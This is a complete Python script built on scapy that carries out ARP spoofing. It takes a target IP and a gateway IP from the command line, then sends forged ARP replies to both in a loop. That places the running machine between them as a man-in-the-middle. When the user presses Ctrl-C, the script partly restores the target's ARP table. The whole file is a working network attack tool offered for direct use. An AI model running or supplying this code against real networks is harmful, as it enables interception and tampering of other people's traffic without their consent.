import scapy.all as scapy
import time
import sys
import optparse

TARGET_IP = None
ROUTER_IP = None

def parse_command(): # Parse the command line arguements
    global TARGET_IP, ROUTER_IP   # Use the global variables
    parser = optparse.OptionParser()
    parser.add_option("-t","--target", dest = "targetip",help = "Target IP address")
    parser.add_option("-r","--router", dest = "routerip",help = "Router(Gateway) IP address")
    (opts,_) = parser.parse_args()
    TARGET_IP = opts.targetip
    ROUTER_IP = opts.routerip
    print(f"Target IP: {TARGET_IP}")
    print(f"Router IP: {ROUTER_IP}")

def get_MAC(ipaddr):
    try:
        arp_req = scapy.ARP(pdst = ipaddr)
        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
        arp_req_bc = broadcast / arp_req

        ans, unans = scapy.srp(arp_req_bc, timeout = 1, verbose = False)

        return ans[0][1].hwsrc

    except Exception as e:
        return None


def spoof_helper(target_ip, spoof_ip):
    try:
        MAC = get_MAC(target_ip)
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = MAC, psrc = spoof_ip)
        scapy.send(packet, verbose = False)
    except Exception as e:
        return None


def restore_helper(dest_ip, src_ip):
    dstMAC = get_MAC(dest_ip)
    srcMAC = get_MAC(src_ip)
    pkt = scapy.ARP(op = 2, pdst = dest_ip, hwdst = dstMAC, psrc = src_ip, hwsrc = srcMAC )
    scapy.send(pkt, verbose = False, count = 3) # Send it 3 times to make sure of it

def restore():
    restore_helper(TARGET_IP, ROUTER_IP)

def spoof():
    pkt_cnt = 0
    while True: # Send packets repeteadly to make sure of ARP spoof
        try: # Error handling added since it may fail for some iterations
            spoof_helper(TARGET_IP, ROUTER_IP)
            spoof_helper(ROUTER_IP, TARGET_IP)
        except Exception as e:
            sys.stdout.flush()
            continue
        pkt_cnt += 2
        print("\r[+] Sent packets:" + str(pkt_cnt), end = '')
        time.sleep(2) # time.sleep(2) did  work with error handling

if __name__ == "__main__":
    try:
        parse_command()
    except Exception as e:
        print("[-] PARSING FAILED!")

    try:
        spoof()
    except KeyboardInterrupt:
        print("\n[-] CTRL-C detected! Restoring the ARP table for the target ...")
        restore()

